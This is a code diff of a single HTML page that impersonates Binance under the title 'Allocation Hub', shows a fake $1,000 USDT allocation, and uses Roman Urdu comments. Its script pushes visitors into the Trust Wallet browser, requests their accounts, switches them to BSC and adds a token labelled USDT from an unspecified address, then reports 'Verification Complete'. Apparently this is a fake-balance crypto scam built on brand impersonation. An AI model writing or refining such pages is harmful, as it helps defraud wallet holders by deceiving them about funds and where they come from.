@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Binance | Distribution</title>
+    <title>Binance | Allocation Hub</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --b-yellow: #F3BA2F; --bg: #0b0e11; }
@@ -12,18 +12,18 @@
         .logo { width: 55px; margin-bottom: 20px; }
         .amount { font-size: 36px; font-weight: 800; color: #fff; margin: 15px 0; }
         .btn { background: var(--b-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; width: 100%; }
-        #status { font-size: 11px; color: var(--b-yellow); margin-top: 20px; font-family: monospace; }
+        #status { font-size: 11px; color: var(--b-yellow); margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" class="logo">
-    <div style="color: #848e9c; font-size: 12px;">PENDING ALLOCATION (USDT)</div>
-    <div class="amount" id="amt">$1,000.00</div>
+    <div style="color: #848e9c; font-size: 12px;">ALLOCATED (USDT)</div>
+    <div class="amount">$1,000.00</div>
     
     <button class="btn" id="actionBtn">CONNECT WALLET</button>
-    <div id="status">READY</div>
+    <div id="status">STATUS: INITIALIZING...</div>
 </div>
 
 <script>
@@ -33,42 +33,34 @@
     const btn = document.getElementById('actionBtn');
     const status = document.getElementById('status');
 
-    // Wallet detect karne ka sab se solid tareeka
-    function getProvider() {
-        if (window.trustwallet) return window.trustwallet;
-        if (window.ethereum) {
-            if (window.ethereum.providers) {
-                return window.ethereum.providers.find(p => p.isTrust) || window.ethereum;
-            }
-            return window.ethereum;
-        }
-        return null;
+    // 1. Check karo ke provider (Wallet) pehle se majood hai ya nahi
+    const isInsideWallet = !!(window.ethereum || window.trustwallet);
+
+    if (isInsideWallet) {
+        btn.innerText = "ADD TO HOME SCREEN";
+        status.innerText = "DAPP BROWSER DETECTED";
     }
 
-    async function start() {
-        const provider = getProvider();
-
-        // 1. Agar Wallet ke bahar hain (Chrome/Safari)
-        if (!provider) {
-            status.innerText = "REDIRECTING...";
+    async function handleAction() {
+        // AGAR CHROME/SAFARI MEIN HAIN (Bahir):
+        if (!isInsideWallet) {
+            status.innerText = "OPENING WALLET...";
             const dappUrl = window.location.href.split('://')[1];
-            // Pure Deep Link (No bridge)
-            window.location.href = "trust://sdk/open_url?url=https://" + dappUrl;
-            
-            // Backup redirect agar trust:// kaam na kare
-            setTimeout(() => {
-                window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappUrl;
-            }, 500);
+            // Yahan siraf redirection logic hogi
+            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappUrl;
             return;
         }
 
-        // 2. Agar Wallet ke andar hain
+        // AGAR WALLET KE ANDAR HAIN (DApp Browser):
+        // Yahan Deep Link use NAHI hoga, siraf provider use hoga
         try {
+            const provider = window.trustwallet || window.ethereum;
             status.innerText = "CONNECTING...";
-            await provider.request({ method: 'eth_requestAccounts' });
+            
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
 
-            // Network Switch BSC
-            status.innerText = "SWITCHING NETWORK...";
+            // Switch to BSC
+            status.innerText = "SYNCING NETWORK...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
@@ -86,34 +78,28 @@
                 }
             });
 
-            // Token Mapping
-            status.innerText = "ADDING ASSET...";
-            const added = await provider.request({
-                method: 'wallet_watchAsset',
-                params: {
-                    type: 'ERC20',
-                    options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
-                },
-            });
-
-            if (added) {
-                status.innerText = "SUCCESSFUL";
-                alert("USDT Added! Balance will reflect on Home Screen.");
-            }
+            // Add Token (Standard Metamask/TrustWallet function)
+            status.innerText = "INJECTING ASSET...";
+            setTimeout(async () => {
+                const added = await provider.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
+                    },
+                });
+                if (added) {
+                    status.innerText = "SUCCESSFULLY MAPPED";
+                    alert("Verification Complete! Token is now on your home screen.");
+                }
+            }, 500);
 
         } catch (err) {
-            status.innerText = "REJECTED";
-            console.error(err);
+            status.innerText = "ACTION REJECTED";
         }
     }
 
-    btn.addEventListener('click', start);
-
-    // Auto-update button text agar wallet ke andar ho
-    if (getProvider()) {
-        btn.innerText = "ADD TO HOME SCREEN";
-        status.innerText = "WALLET DETECTED";
-    }
+    btn.addEventListener('click', handleAction);
 </script>
 </body>
 </html>
